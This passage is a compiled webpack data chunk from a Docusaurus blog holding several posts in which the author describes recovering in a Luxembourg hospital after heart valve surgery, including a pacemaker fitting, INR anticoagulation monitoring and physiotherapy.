"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[9258],{4634:e=>{e.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"/2025/10/14/days-10-11-quiet-days-and-transfer","metadata":{"permalink":"/docs/blog/2025/10/14/days-10-11-quiet-days-and-transfer","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2025-10-14-days-10-11-quiet-days-and-transfer.md","source":"@site/blog/2025-10-14-days-10-11-quiet-days-and-transfer.md","title":"Days 10-12 of Recovery - Transfer to Kirchberg and Cardiologist Care","description":"Days 10-12 post-surgery: quiet Sunday, transfer from INCCI to Kirchberg, and beginning specialised cardiac monitoring.","date":"2025-10-14T00:00:00.000Z","tags":[{"inline":true,"label":"Heart","permalink":"/docs/blog/tags/heart"},{"inline":true,"label":"Surgery","permalink":"/docs/blog/tags/surgery"},{"inline":true,"label":"Recovery","permalink":"/docs/blog/tags/recovery"},{"inline":true,"label":"Aorta","permalink":"/docs/blog/tags/aorta"},{"inline":true,"label":"Hospital","permalink":"/docs/blog/tags/hospital"},{"inline":true,"label":"Kirchberg","permalink":"/docs/blog/tags/kirchberg"},{"inline":true,"label":"INCCI","permalink":"/docs/blog/tags/incci"}],"readingTime":5.09,"hasTruncateMarker":true,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Days 10-12 of Recovery - Transfer to Kirchberg and Cardiologist Care","authors":["mark-burton"],"tags":["Heart","Surgery","Recovery","Aorta","Hospital","Kirchberg","INCCI"],"description":"Days 10-12 post-surgery: quiet Sunday, transfer from INCCI to Kirchberg, and beginning specialised cardiac monitoring.","date":"2025-10-14"},"unlisted":false,"nextItem":{"title":"Day 9 of Recovery - Pacemaker Results, You Won\'t Believe What Comes Next","permalink":"/docs/blog/2025/10/12/day-9-pacemaker-recovery"}},"content":"## Sunday, 12th October 2025 - Day 10\\n\\nDay 10 was a very quiet day, two days after the pacemaker surgery. The focus was on waiting for news about the next stage of my recovery journey, though the delay in transferring to Kirchberg felt frustrating as it meant another day before ultimately getting home.\\n\\n\x3c!--truncate--\x3e\\n\\n## Waiting for Transfer News\\n\\nThe doctors did their rounds at about 10:30. Unfortunately, they confirmed what I feared - Kirchberg didn\'t have a bed available today. However, my move to Kirchberg is confirmed for tomorrow, so at least I have the certainty now that I will be transferred. Knowing the plan, even if delayed by a day, provides peace of mind.\\n\\nThe doctor did tell me that if I have visitors today, I am permitted to go to the caf\xe9 with them downstairs, which would be the first time I have been out of the ward, apart from for tests, since I entered the hospital 11 days ago. After so long confined to the ward, the prospect of simply sitting in a caf\xe9 felt like a significant milestone.\\n\\n## An Afternoon of Freedom\\n\\nAt 15:00 some friends came to visit, and I was allowed out! I had a frothy coffee, a cold sparkling water and very pleasant catch-up. It was wonderful to have a change of scenery and to spend time with friends outside the clinical environment of the ward. These small moments of normalcy are incredibly valuable during a long hospital stay.\\n\\n## Day 10 Summary\\n\\nKey developments on Day 10:\\n\\n* \u2705 Transfer to Kirchberg confirmed for Monday (Day 11)\\n* \u2705 First permission to leave the ward for social visits\\n* \u2705 Successful caf\xe9 visit with friends - first time out in 11 days\\n* \u2705 Quiet day allowing continued recovery from pacemaker surgery\\n\\nWhilst the delay was frustrating as it meant spending another day in hospital and delaying my eventual return home, the confirmation of tomorrow\'s transfer at least provided certainty about the next step. The caf\xe9 visit offered a welcome break from the ward environment.\\n\\n## Monday, 13th October 2025 - Day 11\\n\\nAs expected today, I moved from INCCI to Kirchberg after I had eaten my breakfast and had clean dressings put on.\\n\\n## The Last Walk and Sudden Departure\\n\\nThe physio arrived for a last walk, but just as I said I think I have time, the transport arrived so we had to skip the walk. My belongings were stuffed into my bags and I was wheeled out of INCCI and into a luxambulance for my transfer to Kirchberg.\\n\\n## Transfer to Kirchberg\\n\\nTraffic wasn\'t terrible - 20 minutes later I was wheeled into the cardiology ward in Kirchberg hospital, a somewhat calmer vibe than INCCI. My vital stats were checked and tested to the mobile heart monitor. Today is for monitoring and continuation of the care from INCCI. Tomorrow morning I will meet my cardiologist, after which there should be a clearer plan for my stay and hopefully a confirmed day for returning home - please let it be Wednesday.\\n\\n## Day 11 Summary\\n\\nKey developments on Day 11:\\n\\n* \u2705 Final breakfast and dressing change at INCCI\\n* \u2705 Planned physio walk cancelled due to early transport arrival\\n* \u2705 Successfully transferred to Kirchberg hospital via luxambulance (20 minutes)\\n* \u2705 Settled into cardiology ward with calmer atmosphere\\n* \u2705 Vital signs monitoring and mobile heart monitor setup\\n* \u2705 Awaiting cardiologist consultation on Day 12\\n\\n## Tuesday, 14th October 2025 - Day 12\\n\\nDay 12 started early - very early. The nurse was in to take blood to get an INR at 4:50, followed by another nurse to do an ECG. I soon dropped off until 7:15, which felt like a better hour to wake up.\\n\\n## INR Results and Doctor\'s Rounds\\n\\nMy INR was 1.4 - that is slightly higher than a normal person but lower than the 2-3 I am looking for to ensure there are no blood clots as a result of the mechanical aorta.\\n\\nThe doctor did his rounds around 11:00 and the news was not what I wanted to hear. With the INR being low, he said I could be home by the end of the week. If the INR is better tomorrow, it could be Thursday.\\n\\n## First Physio Session at Kirchberg\\n\\nThe physio introduced me to the 8-week rehabilitation course which will start a week or 2 after I return home, depending on a new group starting with a space. I will rehabilitate together with the same people for the 8 weeks.\\n\\nI did my first physio session which, like at INCCI, involved a walk on the ward and a flight of stairs, but then went on to various standing exercises like heel raises, toe raises and leg raises to the side and behind.\\n\\n## Planning Ahead\\n\\nI\'ll have some time to pass while I wait for my INR to come good, so it seems like a good opportunity to try out [spec-kit](https://github.com/khulnasoft/spec-kit) to do spec-driven development of an app to remind me to take my blood medicine in the evening and do a blood test and log my INR in the morning.\\n\\n## Day 12 Summary\\n\\nKey developments on Day 12:\\n\\n* \u2705 Early morning blood draw (4:50 AM) for INR test\\n* \u2705 INR result: 1.4 (below target range of 2-3)\\n* \u2705 Discharge delayed - potentially end of week, Thursday if INR improves\\n* \u2705 Introduction to 8-week rehabilitation programme\\n* \u2705 First comprehensive physio session with exercises\\n* \u2705 Planning medication tracking app development\\n\\nThe lower than expected INR means a few more days at Kirchberg, which is frustrating but necessary to ensure the blood is at the right consistency to prevent clots with the mechanical valve.\\n\\n## Progress Summary\\n\\nDays 10-12 represent a crucial transition phase in my recovery - from the frustrating delay after pacemaker surgery, through the transfer from acute care at INCCI to specialist cardiac monitoring at Kirchberg, where my cardiologist will finalise the plan for discharge and return to normal life.\\n\\nThe caf\xe9 visit on Day 10 was a poignant reminder that recovery isn\'t just about medical milestones, but also about reconnecting with normal life, one small step at a time. The transfer on Day 11 moved me to the next stage of care."},{"id":"/2025/10/12/day-9-pacemaker-recovery","metadata":{"permalink":"/docs/blog/2025/10/12/day-9-pacemaker-recovery","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2025-10-12-day-9-pacemaker-recovery.md","source":"@site/blog/2025-10-12-day-9-pacemaker-recovery.md","title":"Day 9 of Recovery - Pacemaker Results, You Won\'t Believe What Comes Next","description":"Day 9 post-surgery: excellent pacemaker results, removal of temporary wires, and news about the next stage of care.","date":"2025-10-12T00:00:00.000Z","tags":[{"inline":true,"label":"Heart","permalink":"/docs/blog/tags/heart"},{"inline":true,"label":"Surgery","permalink":"/docs/blog/tags/surgery"},{"inline":true,"label":"Recovery","permalink":"/docs/blog/tags/recovery"},{"inline":true,"label":"Aorta","permalink":"/docs/blog/tags/aorta"},{"inline":true,"label":"Pacemaker","permalink":"/docs/blog/tags/pacemaker"}],"readingTime":4.09,"hasTruncateMarker":true,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Day 9 of Recovery - Pacemaker Results, You Won\'t Believe What Comes Next","authors":["mark-burton"],"tags":["Heart","Surgery","Recovery","Aorta","Pacemaker"],"description":"Day 9 post-surgery: excellent pacemaker results, removal of temporary wires, and news about the next stage of care.","date":"2025-10-12"},"unlisted":false,"prevItem":{"title":"Days 10-12 of Recovery - Transfer to Kirchberg and Cardiologist Care","permalink":"/docs/blog/2025/10/14/days-10-11-quiet-days-and-transfer"},"nextItem":{"title":"Day 8 of Recovery - Additional Surgery to Fit Pacemaker","permalink":"/docs/blog/2025/10/11/day-8-pacemaker-surgery"}},"content":"## Saturday, 11th October 2025\\n\\nDay 9 brought some pivotal moments in my recovery journey - pacemaker assessment results and news about the next stage of my care.\\n\\nI woke up, you guessed it, in pain, but my breakfast was there so the nurse helped me get upright. At this point I was allowed to stand up but until we had the results from the doctors I was still confined to my room.\\n\\n\x3c!--truncate--\x3e\\n\\n## The Morning Wait\\n\\nEvery other day during my stay in the hospital the doctors have been there promptly with breakfast, not today. So I had breakfast and waited. The nurse didn\'t know why they were late, good news? Bad news? No news? Waited a while and the nurse decided I should get ready for the day, you know Murphy\'s law, if I go into the bathroom and turn the shower on surely that will summon the doctors :)\\n\\nAs it happens, no, it didn\'t, so I was helped back into bed to get comfortable for the remainder of the wait.\\n\\n## Excellent News from the Doctors\\n\\nWell, whatever the reason for the delay I needn\'t (use that exact word it is definitely a real word) have worried, around 10:15 the doctors arrived and their demeanour was jovial. The first task at hand was to remove my temporary pacemaker wires, one doctor took care of that while the other left me with the teaser he would return \\"with great plans for me\\". Removal of the pacemaker wires was quick and pretty painless.\\n\\nThe other doctor was on the hunt for a machine to read my pacemaker, it took a few minutes, maybe it was in Kirchberg, but he returned with a kind of big old brief case laptop slash leap child computer looking thing, whatever it didn\'t matter what it looks like, it worked and successfully read the pacemaker and the report was good, it had worked properly all night and everything remained exactly where it should be which was confirmed by an ultrasound.\\n\\n## The Plan: Moving to Kirchberg\\n\\nFinally, the teased plans, everything is good, I can move on to the next stage of my recovery a couple of nights in Kirchberg hospital so my cardiologist can have a look at the work. I was deemed fit enough to go home tomorrow, but it was always the plan that I would be discharged to Kirchberg for my cardiologist to observe me for a couple of days.\\n\\n## Afternoon Visit and Entertainment Setup\\n\\nAfter that exciting morning my wife came to visit after circumnavigating Luxembourg.\\n\\nA nurse dropped off an information sheet about the limitations imposed by a pacemaker, not many of concern, this was written in French so my interpretation is mine and I\'m sticking to it:\\n* No more airports, the security scanners are no good for a pacemaker\\n* No more going into shops with security scanners at the door, same reason as above basically\\n* Keep a safe 30-40cm from induction hobs, eerrrr not great then, this I was not aware of before the operation, this might have changed my whole decision making process, but hey I have arms which are longer than 40cm so hopefully this will be fine\\n* No martial arts, I\'ll have to finally give up on ever getting that Tae Kwon Do black belt.\\n* No chopping wood, as enjoyable camping in Krynica Morska was (well we were in a hotel near the camp site) with my cousin in full Bear Grylls mode was next time sadly my wood chopping assistance won\'t be available\\n\\nSince the days are a little slower now I improved my entertainment setup, whilst CNBC Europe had provided some terrible repetitive English language TV for the last week and the Trounwiessel (the accession to the throne - the transition of the Crown from Grand Duke Henri to his son Guillaume) had passed the time last weekend and RTL showed Luxembourg\'s brave battling 4-0 defeat to Germany last night. My tablet arrived, part of my wife\'s epic journey, I\'m all set, work crap removed and VPN installed along with iPlayer so I can join in the family strictly watching.\\n\\nThe day ended with the cannula put in for the IV drip yesterday being taken out. For the first time since the operation I am not punctured :) not sure that will last long though.\\n\\n## Progress Summary\\n\\nKey developments on Day 9:\\n\\n* \u2705 Temporary pacemaker wires successfully removed\\n* \u2705 Pacemaker reading showed perfect function overnight\\n* \u2705 Ultrasound confirmed everything in correct position\\n* \u2705 Approved for transfer to Kirchberg hospital\\n* \u2705 Cardiologist observation scheduled for next few days\\n* \u2705 Received pacemaker limitation information\\n* \u2705 Improved entertainment options with tablet and VPN\\n* \u2705 Cannula removed - first time not punctured since operation\\n\\nThe pacemaker is working brilliantly and I\'m progressing well enough to move to the next phase of recovery under my cardiologist\'s care at Kirchberg. The medical team\'s positive demeanour this morning was a clear indicator that things are going according to plan."},{"id":"/2025/10/11/day-8-pacemaker-surgery","metadata":{"permalink":"/docs/blog/2025/10/11/day-8-pacemaker-surgery","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2025-10-11-day-8-pacemaker-surgery.md","source":"@site/blog/2025-10-11-day-8-pacemaker-surgery.md","title":"Day 8 of Recovery - Additional Surgery to Fit Pacemaker","description":"Day 8 post-surgery: heart rhythm concerns lead to permanent pacemaker implantation procedure.","date":"2025-10-11T00:00:00.000Z","tags":[{"inline":true,"label":"Heart","permalink":"/docs/blog/tags/heart"},{"inline":true,"label":"Surgery","permalink":"/docs/blog/tags/surgery"},{"inline":true,"label":"Recovery","permalink":"/docs/blog/tags/recovery"},{"inline":true,"label":"Aorta","permalink":"/docs/blog/tags/aorta"},{"inline":true,"label":"Pacemaker","permalink":"/docs/blog/tags/pacemaker"}],"readingTime":5.13,"hasTruncateMarker":true,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Day 8 of Recovery - Additional Surgery to Fit Pacemaker","authors":["mark-burton"],"tags":["Heart","Surgery","Recovery","Aorta","Pacemaker"],"description":"Day 8 post-surgery: heart rhythm concerns lead to permanent pacemaker implantation procedure.","date":"2025-10-11"},"unlisted":false,"prevItem":{"title":"Day 9 of Recovery - Pacemaker Results, You Won\'t Believe What Comes Next","permalink":"/docs/blog/2025/10/12/day-9-pacemaker-recovery"},"nextItem":{"title":"Days 6-7 of Recovery - Settling Into the Normal Ward","permalink":"/docs/blog/2025/10/08/day-5-normal-ward-progress"}},"content":"## Day 8: Friday, 10th October 2025\\n\\nMy recovery took an unexpected turn today as persistent heart rhythm issues necessitated additional intervention - the implantation of a permanent pacemaker to replace the temporary external device I\'ve been carrying since the valve replacement surgery.\\n\\n\x3c!--truncate--\x3e\\n\\n## Early Morning Blood Test\\n\\nThe day started at 5:30 AM when the night shift nurses arrived for a blood test. They had kindly advised me the previous evening that this would be happening, which made the early wake-up call less jarring. It\'s these small considerations that make hospital life more bearable.\\n\\n## Morning Consultation with the Doctors\\n\\nDuring the morning catch-up with the medical team, they explained that whilst my heart\'s behaviour isn\'t dangerous, it continues to exhibit patterns that can\'t be allowed to persist after discharge. The team mentioned that the rhythmologue - we don\'t seem to use that word in English, preferring the more straightforward \\"heart rhythm specialist\\" - would be speaking with me today. This specialist focuses specifically on cardiac rhythm disorders and would have the final say on treatment.\\n\\n## The Rhythmologist\'s Decision\\n\\nShortly after breakfast, the surgical assistant dropped by with a message from the rhythmologist. The misbehaviour of my heart rhythm was significant enough to make a permanent pacemaker the best next step. For me, this represents quite an improvement over the portable external Osypka Pace 203H I\'ve been carrying around for the past week, with its electrode cables threaded through my chest wall.\\n\\nA permanent pacemaker will be completely internal, eliminating the need to carry external equipment and providing more reliable, long-term rhythm management.\\n\\n## Understanding Pacemaker Implantation\\n\\nCompared to the major open-heart surgery I underwent eight days ago, pacemaker implantation is a relatively straightforward procedure. The operation typically takes 1-2 hours and is performed under local anaesthetic with sedation.\\n\\nThe procedure involves:\\n\\n1. **Incision**: A small cut (typically 5-8 cm) is made just below the collarbone, usually on the left side\\n2. **Lead insertion**: Two thin, insulated wires (leads) are threaded through a vein and guided into position in the heart chambers using X-ray imaging\\n3. **Lead attachment**: The leads are attached to the heart muscle where they can sense the heart\'s electrical activity and deliver electrical impulses when needed\\n4. **Pacemaker placement**: The pacemaker device itself - about the size of a large wristwatch - is inserted into a small pocket created under the skin beneath the collarbone\\n5. **Connection**: The leads are connected to the pacemaker generator\\n6. **Testing**: The system is tested to ensure proper functioning\\n7. **Closure**: The incision is closed with dissolvable stitches\\n\\nIn my case, due to being relatively young for a pacemaker recipient, the doctor opted for a cutting-edge approach: His bundle pacing (HBP) or left bundle branch area pacing (LBBAP). This technique provides more natural stimulation of the heart with less energy consumption, which translates to longer battery life for the pacemaker - an important consideration given my age.\\n\\nThe pacemaker will monitor my heart rhythm continuously and provide electrical impulses to maintain a steady heartbeat whenever needed. Modern pacemakers are incredibly sophisticated, automatically adjusting to my activity levels and only intervening when necessary.\\n\\n## Pre-Operation Preparation\\n\\nAt 12:00, the pre-operative preparations began:\\n\\n* **Chest shave**: Clearing the surgical site for optimal sterility and electrode placement\\n* **Isobetadine wash**: The familiar dark red antiseptic wash I\'d experienced before my valve surgery\\n* **Mouthwash**: Part of the standard infection prevention protocol\\n\\nAt 15:00, I was taken through to the surgical wing of the hospital for final preparation. I received my top-quality hospital bed socks - essential for keeping warm in the chilly operating theatre. An IV line was inserted, and with a hair net on, I was ready to go.\\n\\nThe operation was scheduled for 16:00 (4:00 PM).\\n\\n## Post-Procedure Update\\n\\nThe surgery started on time at 16:00, and the attempt to use the branch bundle approach was a success. By 17:15, I was back in my hospital room with my wife, sporting a brand new freshly stitched and glued wound. I\'m now confined to bed until morning - somewhat more comfortable as I can\'t wear the post-thorax protective gilet.\\n\\nMy shoulder started to wake up at about 19:30 - an interesting feeling. Not pain yet, but frozen, heavy, and I can\'t move it. Having explained this to the nurses, pain medicine was prescribed, as it will be pain before morning. I was able to get some sleep quite quickly.\\n\\nI was woken by the night shift nurses doing their check around 21:30, and there was pain - quite a lot of pain. They quickly fixed that with some analgesics, and thankfully I was able to sleep again. At 3:30, either noises in the corridor or the pain woke me - pretty bad again. I buzzed for the nurse and got more pain relief, and again, thankfully, quickly back to sleep, this time all the way until breakfast time.\\n\\n## Reflections\\n\\nWhilst an additional surgical procedure wasn\'t in the original recovery plan, it\'s reassuring to know the medical team is taking a proactive approach to ensure the best long-term outcome. The temporary pacemaker has been functional but cumbersome - having an internal, permanent solution will be a significant quality of life improvement.\\n\\nThe fact that this is considered a relatively minor procedure compared to the valve replacement helps put it in perspective. Eight days ago, I underwent open-heart surgery with a heart-lung bypass machine. Today\'s procedure, whilst important, is far less invasive and carries significantly lower risks.\\n\\nI was awake throughout the pacemaker procedure. The worst pain was from the local anaesthetic injections. The surgeon warned me I might feel the cutting - I could, and I didn\'t like it. They gave me some more local anaesthetic, and after that, the only things I felt were the beating of my heart racing as they tested things and being pulled around as they stitched and glued me back together. I don\'t think I even got sedated - just an antibiotic drip.\\n\\nI\'m grateful for the thorough monitoring that identified this need before discharge, and for the expertise of the cardiac rhythm team in making this decision."},{"id":"/2025/10/08/day-5-normal-ward-progress","metadata":{"permalink":"/docs/blog/2025/10/08/day-5-normal-ward-progress","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2025-10-08-day-5-normal-ward-progress.md","source":"@site/blog/2025-10-08-day-5-normal-ward-progress.md","title":"Days 6-7 of Recovery - Settling Into the Normal Ward","description":"Days 6-7 post-surgery: settling into the normal ward routine, managing tachycardia, and continuing physiotherapy whilst the medical team determines the optimal medication approach.","date":"2025-10-09T00:00:00.000Z","tags":[{"inline":true,"label":"Heart","permalink":"/docs/blog/tags/heart"},{"inline":true,"label":"Surgery","permalink":"/docs/blog/tags/surgery"},{"inline":true,"label":"Recovery","permalink":"/docs/blog/tags/recovery"},{"inline":true,"label":"Aorta","permalink":"/docs/blog/tags/aorta"}],"readingTime":5.68,"hasTruncateMarker":true,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Days 6-7 of Recovery - Settling Into the Normal Ward","authors":["mark-burton"],"tags":["Heart","Surgery","Recovery","Aorta"],"description":"Days 6-7 post-surgery: settling into the normal ward routine, managing tachycardia, and continuing physiotherapy whilst the medical team determines the optimal medication approach.","date":"2025-10-09"},"unlisted":false,"prevItem":{"title":"Day 8 of Recovery - Additional Surgery to Fit Pacemaker","permalink":"/docs/blog/2025/10/11/day-8-pacemaker-surgery"},"nextItem":{"title":"Day 5 - Progress on the Normal Ward","permalink":"/docs/blog/2025/10/07/day-6-normal-ward-progress"}},"content":"## Days 6-7: Wednesday-Thursday, 8th-9th October 2025\\n\\nDays 2 and 3 on the normal ward were remarkably similar, establishing a new routine whilst the medical team continued to fine-tune my treatment.\\n\\n\x3c!--truncate--\x3e\\n\\n## Daily Routine\\n\\nThe normal ward routine is more relaxed than intensive or intermediate care. Nothing happens until 7:30 when breakfast arrives along with the standard observations - blood pressure, heart rate, temperature, and oxygen saturation. The doctor\'s team then comes round with updates. On Day 5, I woke earlier with a headache and buzzed for paracetamol before going back to sleep until breakfast time.\\n\\nThe food has been pretty good since moving off the terrible no-residual diet - there\'s even a menu with a couple of choices and a vegetarian option, though breakfast remained uninspiring.\\n\\n## Physiotherapy Progress\\n\\nDay 5 brought a significant milestone. After getting ready, I headed for a short stroll and ran into the physio. Before we could start, I was called for an X-ray. The physio took over as my chaperone, and we walked to the X-ray department at quite a clip whilst I explained my elevated heart rate situation.\\n\\nThe X-ray was super quick, and the physio guided me back via a flight of stairs. Made it all the way up today! Back in my room, I discovered I\'d even scored one Google Fit heart point - my first one post-surgery! Throughout the day, I achieved 3279 steps and climbed 2 flights of stairs in total.\\n\\nLater that afternoon, after breathing exercises and lunch, the physio returned for another stairs session. Three of us from the ward congregated at the top for a rest. I won first place for highest heart rate, but my only prize was more loud heart noises in my head.\\n\\nDay 6 followed a similar pattern - the main difference being no X-ray scheduled. The routine of physiotherapy sessions, walking exercises throughout the ward, and regular breathing exercises with the respiratory exerciser continued. I managed approximately 3600 steps and 1 flight of stairs. On my last walk of the corridor, my heart rate hit 150+, which was concerning enough that I was prescribed half a pill of medication to help slow it down a bit.\\n\\n## Ongoing Tachycardia Management\\n\\nThe surgeon reassured me on Day 5 that I was experiencing common phenomena amongst younger aortic valve replacement patients. While the exact mechanics might not be clearly understood, the heart just got a significant upgrade and occasionally it will skip a beat. In his experience, this is a fairly simple fix: keep drinking plenty of water and doing plenty of walking. I am back on the mobile pacemaker just to be sure.\\n\\n\x3c!-- TODO: Look for research on post-operative heart rate variations in younger aortic valve replacement patients with references --\x3e\\n\\nBy Day 6, the team were still deciding on the correct medication to address my tachycardia. The situation is complicated by a one-off momentary pause that was caught on my continual monitoring. Whilst apparently not super uncommon in post-operative valve replacement patients, it does deserve additional monitoring. This is causing the decision-making process to take a bit longer than initially expected.\\n\\nThe combination of elevated heart rate along with the single brief pause means the medical team need to balance the medication carefully - they want to control the rapid heart rate without potentially causing more pauses. The mobile pacemaker continues to provide reassurance and detailed monitoring data to help guide treatment decisions.\\n\\n## Anticoagulation Education\\n\\nOn Day 5, I had an important discussion with the nurse about Sintrom (acenocoumarol), the anticoagulation medication I\'ll be taking long-term. This education session was crucial for understanding my post-discharge care.\\n\\n### Why Sintrom is Essential\\n\\nWith a mechanical aortic valve, anticoagulation is vital to prevent blood clots from forming on the valve. The mechanical valve surfaces, whilst durable, can promote clot formation if the blood isn\'t properly thinned. Sintrom works by interfering with vitamin K-dependent clotting factors, reducing the blood\'s ability to clot.\\n\\n### INR Monitoring\\n\\nThe International Normalised Ratio (INR) is the key metric for monitoring anticoagulation levels. I\'ll be able to monitor my INR at home using a portable testing device, similar to how diabetics monitor blood glucose. The target INR range for mechanical valve patients is typically 2.5-3.5, balancing clot prevention against bleeding risk.\\n\\n### Consistency is Critical\\n\\nThe nurse emphasised two crucial timing considerations:\\n\\n* **Medication timing**: Take Sintrom in the evening, at the same time each day\\n* **Testing timing**: Perform INR tests in the morning, consistently\\n\\nThis consistency ensures accurate monitoring and stable anticoagulation levels. Irregular timing can lead to fluctuating INR values that don\'t truly reflect the medication\'s effects.\\n\\n### Dietary Considerations\\n\\nSintrom works by antagonising vitamin K, which means dietary vitamin K intake needs to be consistent. The key isn\'t to avoid vitamin K entirely, but to maintain steady consumption levels. Foods particularly high in vitamin K include:\\n\\n* **Leafy greens**: Cabbage, spinach, kale, lettuce, Brussels sprouts\\n* **Cruciferous vegetables**: Broccoli, cauliflower\\n* **Herbs**: Parsley, coriander, basil\\n* **Other vegetables**: Asparagus, spring onions\\n* **Some oils**: Soybean oil, canola oil\\n\\nThe nurse stressed that I don\'t need to eliminate these healthy foods - just maintain consistency. If I eat spinach regularly, I should continue to do so. The problem arises when someone dramatically changes their vitamin K intake, which can either reduce the medication\'s effectiveness (if intake increases) or increase bleeding risk (if intake decreases).\\n\\n## Progress Summary\\n\\nKey developments over these two days:\\n\\n* \u2705 Established routine on normal ward\\n* \u2705 Managing post-operative headaches\\n* \u2705 Consistent physiotherapy and mobility work\\n* \u2705 Achieved first post-surgery fitness milestone (stair climbing and Google Fit heart point)\\n* \u2705 Improved dietary options\\n* \u2705 Comprehensive anticoagulation education session with nurse\\n* \u23f3 Medical team carefully evaluating medication options for tachycardia\\n* \u23f3 Additional monitoring due to single momentary pause event\\n* \u23f3 Continued mobile pacemaker monitoring\\n\\nThe elevated heart rate episodes are concerning but apparently normal for younger patients after valve replacement. Whilst the medication decision is taking longer than expected, this careful approach demonstrates the thoroughness of the cardiac team in managing the nuances of post-operative recovery, particularly in younger valve replacement patients where heart rhythm variations can occur.\\n\\n## Reflections on Progress\\n\\nOver these two days, there\'s been steady progress in mobility and establishing a ward routine, even though the heart rhythm management is proving more complex than anticipated. The ability to climb a full flight of stairs and earn that first fitness point felt like a real achievement, even if it came with some uncomfortable sensations.\\n\\nThe physiotherapy team\'s consistent attention and the medical team\'s thorough approach to medication selection help maintain confidence that these temporary challenges are part of the normal healing process for someone my age going through this procedure.\\n\\nThe next updates may come after a few days, once there are significant developments - particularly regarding the move to Kirchberg and any new treatment decisions."},{"id":"/2025/10/07/day-6-normal-ward-progress","metadata":{"permalink":"/docs/blog/2025/10/07/day-6-normal-ward-progress","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2025-10-07-day-6-normal-ward-progress.md","source":"@site/blog/2025-10-07-day-6-normal-ward-progress.md","title":"Day 5 - Progress on the Normal Ward","description":"First full day on the normal ward with walking exercises, echo results, and adjusting to new routines.","date":"2025-10-08T00:00:00.000Z","tags":[{"inline":false,"label":"Health","permalink":"/docs/blog/tags/health","description":"Health and medical topics"},{"inline":false,"label":"Surgery","permalink":"/docs/blog/tags/surgery","description":"Surgical procedures and experiences"},{"inline":false,"label":"Heart","permalink":"/docs/blog/tags/heart","description":"Cardiac health and heart-related topics"},{"inline":false,"label":"Medical","permalink":"/docs/blog/tags/medical","description":"Medical topics and healthcare"},{"inline":true,"label":"recovery","permalink":"/docs/blog/tags/recovery"}],"readingTime":5.11,"hasTruncateMarker":true,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Day 5 - Progress on the Normal Ward","authors":["mark-burton"],"tags":["health","surgery","heart","medical","recovery"],"description":"First full day on the normal ward with walking exercises, echo results, and adjusting to new routines.","date":"2025-10-08"},"unlisted":false,"prevItem":{"title":"Days 6-7 of Recovery - Settling Into the Normal Ward","permalink":"/docs/blog/2025/10/08/day-5-normal-ward-progress"},"nextItem":{"title":"Day 4 of Recovery - Moving to the Normal Ward","permalink":"/docs/blog/2025/10/07/day-4-move-to-normal-ward"}},"content":"Tuesday, 8th October 2025 - My first full day on the normal ward brought different routines and expectations. The focus shifted to increased mobility and continued monitoring of my heart\'s adaptation to its new hardware.\\n\\n\x3c!--truncate--\x3e\\n\\n## The Missing EEG\\n\\nOn the normal ward, the day was quite different. At least on this first full day, I was waiting for my 5:30 EEG but nothing happened. Which was kind of annoying because I had not slept well and was ready to be helped out of bed. As it happened, I fell asleep for probably my best hour of sleep of the night. No idea what the lack of sleep was all about really.\\n\\n## Morning Visits\\n\\nQuiet morning until the surgeon arrived at about the same time as my breakfast and a nurse to do my blood pressure and heart rate. My surgeon got priority. He explained they are still monitoring my heart, which is expectedly tachycardic after the surgery, to get the beta blocker dose right to allow the heart to reconfigure itself to its new hardware. He made it clear I should walk a lot more today.\\n\\nBefore breakfast, the blood pressure was taken and the mobile pacemaker disconnected. The cables remain hanging out of me - they should be removed in the next couple of days.\\n\\n## Physiotherapy Session\\n\\nAfter breakfast I went for a short walk and nearly missed my physio. I was taken to the stairs where I walked half a flight of stairs basically unaided. I felt OK, but my heart rate had jumped to 125 from my current resting 95/100 (ish), so we left it there for today and descended the stairs and headed back to the room for breathing exercises.\\n\\nThroughout the day, I managed to achieve 3824 steps - a significant increase in mobility as I continued to walk the corridors and work on my recovery.\\n\\nThe breathing exercises included one new one: breathe in fully and hold it for 3 seconds. Like most of the breathing exercises, it was extremely hard at first, but throughout the day it is getting less painful to do.\\n\\n## Echocardiogram Results\\n\\nBefore I could even finish my shower, I had a knock on the door. It was time for an echo to have a look at how the new heart hardware was bedding in. Another positive outcome - the heart looks good and the valve looks good. It is a very different squelch sound now on the echocardiogram with the artificial valve.\\n\\nNot sure if it was something seen on the echo, but the doctor told me I should drink more. I thought it was a bit early in my recovery and the day for a drink. A moment later she clarified \\"water only\\".\\n\\n## Evening Challenges\\n\\nMy wife came to visit with some supplies, which was lovely. I sat down to my dinner feeling a slightly elevated heart rate everywhere - this is something which will take time for my body to adjust to. My heart is beating more efficiently than it has for years, which makes it feel different in my head and chest, especially as it gets up to the 120 bpm level.\\n\\nNear the end of dinner, I felt a little strange for a moment. I heard the notifications go off in the nurses\' station, looked down at my \\"continual monitor necklace\\" (the [Philips MX40-2C4](https://www.philips.co.uk/healthcare/product/HC865350/mx40-wearable-patient-monitor)) and saw my heart rate at 120 with a notification. The feeling passed very quickly and the nurse dismissed the notification, so nothing to worry about.\\n\\nThere was no way I would be able to sleep like that though, with such a high heart rate creating the clattering and banging in my head and the feeling of my heart squirming around in my chest. I explained it all to the nurses, who again reassured me that this is common in younger aortic valve replacement patients. Research indicates that [tachycardia is expected 